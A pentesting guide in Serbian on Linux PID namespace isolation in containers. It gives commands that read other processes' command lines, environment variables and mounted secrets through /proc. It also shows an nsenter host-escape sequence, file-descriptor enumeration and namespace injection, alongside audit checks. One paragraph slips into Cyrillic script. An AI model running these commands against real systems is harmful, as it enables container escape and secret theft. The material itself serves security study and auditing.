# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

PID namespace kontroliše način numerisanja procesa i koji su procesi vidljivi. Zato kontejner može imati sopstveni PID 1 iako nije stvarna mašina. Unutar namespace-a, radno opterećenje vidi ono što izgleda kao lokalno stablo procesa. Izvan namespace-a, host i dalje vidi stvarne PID-ove hosta i celokupan skup procesa.<sup>[[3]](#references)</sup>

Sa bezbednosne tačke gledišta, PID namespace je važan zato što je vidljivost procesa vredna. Kada radno opterećenje može da vidi procese hosta, može da sazna nazive servisa, argumente komandne linije, tajne prosleđene kroz argumente procesa, stanje izvedeno iz okruženja preko `/proc` i potencijalne mete za ulazak u namespace. Ako može i više od pukog pregledanja tih procesa, na primer da šalje signale ili koristi ptrace pod odgovarajućim uslovima, problem postaje mnogo ozbiljniji.

## Rad

Novi PID namespace počinje sopstvenim internim numerisanjem procesa. Prvi proces pokrenut unutar njega postaje PID 1 iz perspektive tog namespace-a, što mu daje i posebnu semantiku nalik init-u za napuštene potomke i ponašanje signala. Ovo objašnjava mnoge neobičnosti kontejnera u vezi sa init procesima, uklanjanjem zombi procesa i razlogom zbog kog se u kontejnerima ponekad koriste mali init wrapper-i.<sup>[[3]](#references)</sup>

PID namespace-ovi čine hijerarhiju. Proces u namespace-u pretka može da adresira potomke pomoću PID-a dodeljenog u namespace-u pretka, ali potomak ne može da adresira zadatke koji postoje samo u namespace-u pretka preko uobičajenih PID sistemskih poziva niti može pomoću `setns()` da se popne u PID namespace pretka. Ipak, procfs koji pripada pretku i koji je namerno izložen potomku može da leak-uje prikaz procesa pretka. Takođe, pridruživanje PID namespace-u pomoću `setns()` menja namespace za **buduće potomke**, a ne za sam pozivalac; zato alati nakon pridruživanja prave fork. Montaža procfs-a zadržava prikaz PID-ova procesa koji ga je montirao, zbog čega je kreiranje novog procfs-a nakon `unshare(CLONE_NEWPID)` važno za bezbednost, a ne samo kozmetičko.<sup>[[3]](#references)</sup>

Važna bezbedносна поука је да процес може изгледати изоловано јер види само сопствено стабло PID-ова, али та изолација може бити намерно уклоњена. Docker ово омогућава опцијом `--pid=host`, док Kubernetes то постиже подешавањем `hostPID: true`. Када се контејнер придружи PID namespace-у hosta, радно оптерећење директно види процесе hosta, што многе касније путање напада чини знатно реалнијим.

## Лабораторија

Да бисте ручно креирали PID namespace:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

Shell sada vidi privatni prikaz procesa. Zastavica `--mount-proc` je važna jer montira instancu procfs-a koja odgovara novom PID namespace-u, čime se obezbeđuje usklađen prikaz procesa iznutra.<sup>[[3]](#references)</sup>

Za poređenje ponašanja kontejnera:

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

Razlika je neposredna i lako razumljiva, zbog čega je ovo dobra prva vežba za čitaoce.

## Upotreba tokom izvršavanja

Uobičajeni kontejneri u Docker-u, Podman-u, containerd-u i CRI-O-u dobijaju sopstveni PID namespace. Kubernetes kontejneri obično imaju zasebne prikaze PID-ova; `shareProcessNamespace: true` namerno stvara prikaz zajednički za ceo Pod.<sup>[[4]](#references)</sup> Nasuprot tome, `hostPID: true` bira PID namespace čvora. LXC/Incus okruženja koriste isti kernel mehanizam, mada slučajevi upotrebe sistemskih kontejnera mogu da izlože složenija stabla procesa i podstaknu korišćenje dodatnih prečica za otklanjanje grešaka.

Isto pravilo važi svuda: ako runtime nije izolovao PID namespace, to predstavlja namerno slabljenje granice kontejnera.

## Pogrešne konfiguracije

Klasična pogrešna konfiguracija je deljenje PID namespace-a sa hostom. Timovi to često opravdavaju praktičnošću otklanjanja grešaka, nadzora ili upravljanja servisima, ali to uvek treba smatrati značajnim bezbednosnim izuzetkom. Čak i ako kontejner nema neposrednu mogućnost upisivanja u host procese, sama vidljivost može mnogo toga da otkrije o sistemu. Kada se dodaju mogućnosti kao što je `CAP_SYS_PTRACE` ili koristan pristup procfs-u, rizik se znatno povećava.

Još jedna greška je pretpostavka da je deljenje PID namespace-a sa hostom bezopasno zato što radno opterećenje podrazumevano ne može da prekida host procese niti da koristi ptrace nad njima. Takav zaključak zanemaruje vrednost enumeracije, dostupnost procesa kao ciljeva za ulazak u namespace i način na koji se vidljivost PID-ova kombinuje sa drugim oslabljenim kontrolama.

### Deljenje procesa na nivou Kubernetes Pod-a

`shareProcessNamespace: true` se razlikuje od `hostPID`: ono izlaže procese **drugih kontejnera u istom Pod-u**, a ne procese čvora. Kompromitovani sidecar ili kontejner za otklanjanje grešaka tada može da enumeriše komandne linije i podatke iz okruženja susednih kontejnera, u skladu sa proverama pristupa procfs-u, da šalje signale kada to dozvoljavaju kredencijali i da pristupa sistemu datoteka susednog kontejnera preko `/proc/<pid>/root`. Kubernetes izričito upozorava da su tada tajne u komandnim linijama i promenljivama okruženja, kao i sistemi datoteka kontejnera, zaštićeni isključivo odgovarajućim Unix dozvolama.<sup>[[4]](#references)</sup>

Korisna provera na strani klastera:

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

Iz kompromitovanog kontejnera u PID namespace-u koji obuhvata ceo Pod, prvo proverite stvarni pristup umesto da pretpostavljate da vidljivost znači i mogućnost čitanja:<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### Ciljani ephemeral kontejneri u postojećem Kubernetes Pod-u

Kubernetes identitet sa dozvolom za izmenu `pods/ephemeralcontainers` može da doda debugger pokrenutom Pod-u čak i kada `shareProcessNamespace` nije podešen. Uz `--target`, debugger se pridružuje prostoru imena procesa navedenog kontejnera ako runtime podržava ciljanje prostora imena. Time se dobija uvid u procese tog kontejnera, a ne u host PID prostor imena node-a.<sup>[[5]](#references)</sup>

API koristi zaseban subresource, zato proverite `patch`/`update` dozvole umesto da pretpostavite da ih pokrivaju uobičajene dozvole za pisanje u Pod.<sup>[[6]](#references)</sup>

Za Pod i kontejner u ovlašćenom namespace-u, testirajte ciljani prikaz:<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

Ako runtime ne podržava targeting, debugger možda neće moći da se pokrene ili će ostati u izolovanom PID namespace-u.<sup>[[5]](#references)</sup> Ako targeting funkcioniše, koristite provere u odeljku [Kubernetes Pod-wide process sharing](#kubernetes-pod-wide-process-sharing) da biste testirali pristup putanji `/proc/<pid>`. Vidljivost ne znači da imate dozvolu da čitate tajne ciljnog procesa ili da mu šaljete signale: Unix akreditivi i provere pristupa u procfs-u i dalje važe.<sup>[[4]](#references)[[8]](#references)</sup> Pod Security Standards takođe ograničavaju privilegovana podešavanja u ephemeral containers-ima.<sup>[[7]](#references)</sup>

## Zloupotreba

Ako je host PID namespace deljen, napadač može da pregleda procese hosta, prikupi argumente procesa, identifikuje zanimljive servise, pronađe potencijalne PID-ove za `nsenter` ili kombinuje vidljivost procesa sa privilegijama povezanim sa ptrace-om kako bi ometao host ili susedna radna opterećenja. U nekim slučajevima, dovoljno je samo uočiti odgovarajući dugotrajni proces da bi se promenio ostatak plana napada.

Prvi praktični korak je uvek da potvrdite da su procesi hosta zaista vidljivi:

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

Kada PID-ovi hosta postanu vidljivi, argumenti procesa i ciljevi za ulazak u namespace često postaju najkorisniji izvor informacija:

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

Ako je `nsenter` dostupan i postoje dovoljne privilegije, proverite da li vidljivi proces hosta može da posluži kao most između namespace-ova:

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

Čak i kada je ulazak blokiran, deljenje PID-ova hosta je već korisno jer otkriva raspored servisa, komponente okruženja za izvršavanje i potencijalne privilegovane procese koji bi mogli biti sledeće mete. Sama vidljivost PID-ova **ne** daje dozvolu za slanje signala, praćenje, čitanje osetljivih unosa u `/proc/<pid>` niti pridruživanje drugim prostorima imena cilja; i dalje su važni akreditivi, mogućnost dumpovanja, capability dozvole u korisničkom prostoru imena koji poseduje ciljni prostor imena, Yama/LSM pravila i seccomp.<sup>[[3]](#references)</sup> Pogledajte [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) za primere ubrizgavanja u procese.

Vidljivost PID-ova hosta takođe čini zloupotrebu deskriptora datoteka realističnijom. Ako privilegovani proces hosta ili susedno radno opterećenje ima otvorenu osetljivu datoteku ili soket, napadač će možda moći da pregleda `/proc/<pid>/fd/` i pristupi osnovnom objektu, u zavisnosti od provera nalik ptrace-u, vlasništva, opcija montiranja procfs-a, tipa objekta i modela ciljnog servisa. Sama činjenica da je simbolička veza ka FD-u vidljiva ne znači da se ona može otvoriti, a soket se ne može duplirati samo otvaranjem njegove simboličke veze `/proc/<pid>/fd/N`. Informacije o zasebnom primitivu `pidfd_getfd()` i njegovim proverama autorizacije potražite u odeljku [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

Ove komande su korisne jer pokazuju da li `hidepid=1` ili `hidepid=2` smanjuje vidljivost između procesa i da li su očigledno zanimljivi deskriptori, kao što su otvorene tajne datoteke, logovi ili Unix soketi, uopšte vidljivi.

### Potpun primer: host PID + `nsenter`

Deljenje host PID-ova može omogućiti host escape kada proces ima potrebne capabilities da se pridruži host namespaces i preuzme root direktorijum host procesa. Za ovo drugo je potreban `nsenter --root` (`-r`): sama promena mount namespace-a ne menja root direktorijum procesa koji poziva komandu.<sup>[[9]](#references)</sup> Pristupanje putanji `/proc/1/root` podleže ptrace proveri čitanja, dok je za promenu root direktorijuma potreban `CAP_SYS_CHROOT` u user namespace-u procesa koji poziva komandu.<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

Ako se komanda uspešno izvrši, nova ljuska koristi host mount, UTS, network, IPC i PID namespaces, kao i korenski fajl-sistem PID-a 1. Proverite efektivni identitet i pristup umesto da pretpostavite da je sama vidljivost PID-ova omogućila privilegije na hostu.<sup>[[9]](#references)</sup>

Čak i kada `nsenter` nedostaje, isti rezultat se možda može postići pomoću binarne datoteke sa hosta ako je fajl-sistem hosta montiran:

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### Nedavne napomene o runtime-u

Neki napadi relevantni za PID namespace nisu posledica tradicionalnih pogrešnih konfiguracija `hostPID: true`, već grešaka u implementaciji runtime-a u načinu na koji se zaštite procfs-a primenjuju tokom podešavanja kontejnera.

#### `maskedPaths` race do host procfs-a

U ranjivim verzijama `runc`-a, napadači koji mogu da kontrolišu image kontejnera ili workload pokrenut pomoću `runc exec` mogli su da se utrkuju sa fazom maskiranja tako što bi zamenili `/dev/null` sa strane kontejnera simboličkim linkom ka osetljivoj putanji procfs-a, kao što je `/proc/sys/kernel/core_pattern`. Ako bi race uspeo, bind mount maskirane putanje mogao je da se postavi na pogrešan cilj i izloži globalne procfs postavke hosta novom kontejneru.<sup>[[1]](#references)</sup>

Korisna komanda za proveru:

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

Ovo je važno jer konačni uticaj može biti isti kao kod direktne izloženosti procfs-a: upisiv `core_pattern` ili `sysrq-trigger`, a zatim izvršavanje koda na host-u ili uskraćivanje usluge. Posebne stranice o [maskiranim putanjama](../masked-paths.md) i [osetljivim montiranim host resursima](../../sensitive-host-mounts.md) obrađuju opštu površinu napada preko procfs-a, bez ponavljanja ovde.

#### Ubacivanje u namespace pomoću `insject`

Alati za ubacivanje u namespace, kao što je `insject`, pokazuju da interakcija sa PID namespace-om ne zahteva uvek ulazak u ciljni namespace pre kreiranja procesa. Pomoćni program može da se prikači naknadno, upotrebi `setns()` i izvršava se uz očuvanu vidljivost unutar prostora PID-ova ciljnog namespace-a:<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

Ova vrsta tehnike važna je uglavnom za napredno otklanjanje grešaka, ofanzivne alate i post-exploitation tokove rada, kada se namespace kontekst mora pridružiti nakon što je runtime već pokrenuo workload.

### Povezani obrasci zloupotrebe FD-ova

Vredi posebno istaći dva obrasca kada su PID-ovi hosta vidljivi. Prvo, privilegovani proces može zadržati otvoren osetljiv file descriptor tokom `execve()` ako nije označen sa `O_CLOEXEC`. Drugo, servisi mogu prosleđivati file descriptore preko Unix soketa koristeći `SCM_RIGHTS`. U oba slučaja, zanimljiv objekat više nije putanja, već već otvoreni handle koji proces sa nižim privilegijama može naslediti ili primiti.

Ovo je važno pri radu sa kontejnerima jer handle može pokazivati na `docker.sock`, privilegovani log, tajni fajl hosta ili neki drugi vredan objekat, čak i kada putanja nije direktno dostupna iz fajl-sistema kontejnera.

## Provere

Svrha ovih komandi je da utvrde da li proces ima privatni PID prikaz ili već može da nabroji mnogo širi skup procesa.

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

Šta je ovde zanimljivo:<sup>[[3]](#references)</sup>

- Ako lista procesa sadrži očigledne servise hosta, deljenje PID prostora hosta je verovatno već aktivno.
- Malo stablo procesa koje sadrži samo procese iz kontejnera predstavlja uobičajeno početno stanje; prisustvo procesa `systemd`, `dockerd` ili nepovezanih servisa nije uobičajeno.
- `NSpid` može da otkrije mapiranje PID-ova kroz ugnježdene prostore imena. Krajnja leva vrednost odnosi se na prostor imena PID-a povezan sa montiranjem procfs-a, a za njom slede vrednosti za sukcesivno ugnježdene prostore imena.
- Sam `readlink /proc/self/ns/pid` ne može da dokaže `hostPID`: i izolovani kontejner ima važeći inode prostora imena PID-a. Uporedite ga sa listom procesa, montiranjem procfs-a, konfiguracijom runtime-a i inode-om prostora imena na hostu, ako je dostupan.
- Kada PID-ovi hosta postanu vidljivi, čak i informacije o procesima dostupne samo za čitanje postaju korisne za izviđanje.

Ako otkrijete da kontejner radi uz deljenje PID prostora hosta, nemojte to smatrati kozmetičkom razlikom. To značajno menja ono što radno opterećenje može da vidi i potencijalno da utiče na njega.





## References

- [1] [Bezbednosno obaveštenje za runc: izlazak iz kontejnera zloupotrebom „masked path“ usled uslova utrke pri montiranju (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Izdanje alata – insject: Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Knjiga Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Deljenje prostora imena procesa između kontejnera u pod-u](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
- [5] [Otklanjanje grešaka u pokrenutim pod-ovima](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
- [6] [KEP za ephemeral kontejnere](https://www.kubernetes.dev/resources/keps/277/)
- [7] [Standardi bezbednosti pod-ova](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
{{#include ../../../../../banners/hacktricks-training.md}}
